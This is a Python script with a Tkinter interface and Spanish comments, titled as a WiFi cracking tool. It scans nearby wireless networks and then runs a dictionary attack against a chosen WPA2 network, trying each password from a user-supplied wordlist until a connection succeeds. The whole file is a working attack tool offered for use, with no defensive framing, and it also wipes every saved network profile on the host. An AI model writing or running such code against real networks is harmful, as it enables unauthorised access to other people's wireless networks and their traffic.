from tkinter import *
from tkinter import ttk
import pywifi
from pywifi import const
import time
import tkinter.filedialog # Abrir la exploración de archivos en Gui
import tkinter.messagebox # Abrir el cuadro de recordatorio de mensaje de tkiner

class MY_GUI():
	def __init__(self,init_window_name):
		self.init_window_name = init_window_name

		# Ruta del archivo de contraseña
		self.get_value = StringVar() # Establecer contenido variable

		#Obtener cuenta wifi
		self.get_wifi_value = StringVar()

		# Obtener contraseña wifi
		self.get_wifimm_value = StringVar()

		self.wifi = pywifi.PyWiFi()  #Grab interfaz de red
		self.iface = self.wifi.interfaces()[0] #Grab la primera tarjeta de red inalámbrica
		self.iface.disconnect()  # Enlace de prueba desconecta todos los enlaces
		time.sleep(1)  # Dormir durante 1 segundo
		# Probar si la tarjeta de red está desconectada
		assert self.iface.status() in\
				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

	def __str__(self):
        # Llama automáticamente a la función, vuelve a su propia tarjeta de red
		return '(WIFI:%s,%s)' % (self.wifi,self.iface.name())

	# Ventana de configuración
	def set_init_window(self):
		self.init_window_name.title("Herramienta de grietas WIFI")
		self.init_window_name.geometry('+500+200')

		labelframe = LabelFrame(width=400, height=200,text="Configuración")  # Frame, los siguientes objetos se agregan al labelframe
		labelframe.grid(column=0, row=0, padx=10, pady=10)

		self.search = Button(labelframe,text="Buscar WiFi cercano",command=self.scans_wifi_list).grid(column=0,row=0)

		self.pojie = Button(labelframe,text="Comience a agrietarse",command=self.readPassWord).grid(column=1,row=0)

		self.label = Label(labelframe,text="Ruta del directorio:").grid(column=0,row=1)

		self.path = Entry(labelframe,width=12,textvariable = self.get_value).grid(column=1,row=1)

		self.file = Button(labelframe,text="Agregar directorio de archivos de contraseña",command=self.add_mm_file).grid(column=2,row=1)

		self.wifi_text = Label(labelframe,text="Cuenta WiFi:").grid(column=0,row=2)

		self.wifi_input = Entry(labelframe,width=12,textvariable = self.get_wifi_value).grid(column=1,row=2)

		self.wifi_mm_text = Label(labelframe,text="Contraseña WiFi:").grid(column=2,row=2)

		self.wifi_mm_input = Entry(labelframe,width=10,textvariable = self.get_wifimm_value).grid(column=3,row=2,sticky=W)

		self.wifi_labelframe = LabelFrame(text="lista wifi")
		self.wifi_labelframe.grid(column=0, row=3,columnspan=4,sticky=NSEW)

		# Definir estructura de árbol y barra de desplazamiento
		self.wifi_tree = ttk.Treeview(self.wifi_labelframe,show="headings",columns=("a", "b", "c", "d"))
		self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
		self.wifi_tree.configure(yscrollcommand=self.vbar.set)

		# Título de la tabla
		self.wifi_tree.column("a", width=50, anchor="center")
		self.wifi_tree.column("b", width=100, anchor="center")
		self.wifi_tree.column("c", width=100, anchor="center")
		self.wifi_tree.column("d", width=100, anchor="center")

		self.wifi_tree.heading("a", text="WiFiID")
		self.wifi_tree.heading("b", text="SSID")
		self.wifi_tree.heading("c", text="BSSID")
		self.wifi_tree.heading("d", text="signal")

		self.wifi_tree.grid(row=4,column=0,sticky=NSEW)
		self.wifi_tree.bind("<Double-1>",self.onDBClick)
		self.vbar.grid(row=4,column=1,sticky=NS)

	# Buscar wifi
	#cmd /k C:\Python27\python.exe "$(FULL_CURRENT_PATH)" & PAUSE & EXIT
	def scans_wifi_list(self):  # Escanear la lista wifi circundante
		# Iniciar escaneo
		print("^ _ ^ Comienza a escanear wifi cercano ...")
		self.iface.scan()
		time.sleep(15)
		# Obtenga resultados de escaneo después de unos segundos
		scanres = self.iface.scan_results()
		#Cuenta el número de puntos de acceso encontrados cerca
		nums = len(scanres)
		print("Cantidad:% s"%(nums))
		#print ("| %s |  %s |  %s | %s"%("WIFIID","SSID","BSSID","signal"))
		# Datos reales
		self.show_scans_wifi_list(scanres)
		return scanres

	# Mostrar lista wifi
	def show_scans_wifi_list(self,scans_res):
		for index,wifi_info in enumerate(scans_res):
            # print("%-*s| %s | %*s |%*s\n"%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
			self.wifi_tree.insert("",'end',values=(index + 1,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
			#print("| %s | %s | %s | %s \n"%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))

	# Agregar directorio de archivos de contraseña
	def add_mm_file(self):
		self.filename = tkinter.filedialog.askopenfilename()
		self.get_value.set(self.filename)

	#Treeview
	def onDBClick(self,event):
		self.sels= event.widget.selection()
		self.get_wifi_value.set(self.wifi_tree.item(self.sels,"values")[1])
		#print("you clicked on",self.wifi_tree.item(self.sels,"values")[1])

	#Lee el diccionario de contraseñas para que coincida
	def readPassWord(self):
		self.getFilePath = self.get_value.get()

		self.get_wifissid = self.get_wifi_value.get()

		pwdfilehander=open(self.getFilePath,"r",errors="ignore")
		while True:
                    try:
                        self.pwdStr=pwdfilehander.readline()

                        if not self.pwdStr:
                            break
                        self.bool1=self.connect(self.pwdStr,self.get_wifissid)

                        if self.bool1:
                            self.res = "=== correcto === nombre de wifi:% s contraseña coincidente:% s"%(self.get_wifissid,self.pwdStr)
                            self.get_wifimm_value.set(self.pwdStr)
                            tkinter.messagebox.showinfo('Consejos', '¡Un crack exitoso! ! ! ')
                            print(self.res)
                            break
                        else:
                            self.res = "--- error --- nombre wifi:% s no coincide con la contraseña:% s"%(self.get_wifissid,self.pwdStr)
                            print(self.res)
                        time.sleep(2)
                    except:
                        continue
	#Match wifi y contraseña
	def connect(self,pwd_Str,wifi_ssid):
		# Crear archivo de enlace wifi
		self.profile = pywifi.Profile()
		self.profile.ssid =wifi_ssid #wifiName
		self.profile.auth = const.AUTH_ALG_OPEN  #Apertura de tarjeta de red
		self.profile.akm.append(const.AKM_TYPE_WPA2PSK)# algoritmo de cifrado wifi
		self.profile.cipher = const.CIPHER_TYPE_CCMP    # Unidad de cifrado
		self.profile.key = pwd_Str # Contraseña
		self.iface.remove_all_network_profiles() # Eliminar todos los archivos wifi
		self.tmp_profile = self.iface.add_network_profile(self.profile)# Establecer nuevo archivo de enlace
		self.iface.connect(self.tmp_profile)#Enlace
		time.sleep(5)
		if self.iface.status() == const.IFACE_CONNECTED:  # Juzgue si conectar
			isOK=True
		else:
			isOK=False
		self.iface.disconnect() #Desconectar
		time.sleep(1)
		# Verificar estado de desconexión
		assert self.iface.status() in\
				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
		return isOK

def gui_start():
	init_window = Tk()
	ui = MY_GUI(init_window)
	print(ui)
	ui.set_init_window()
	#ui.scans_wifi_list()

	init_window.mainloop()

gui_start()
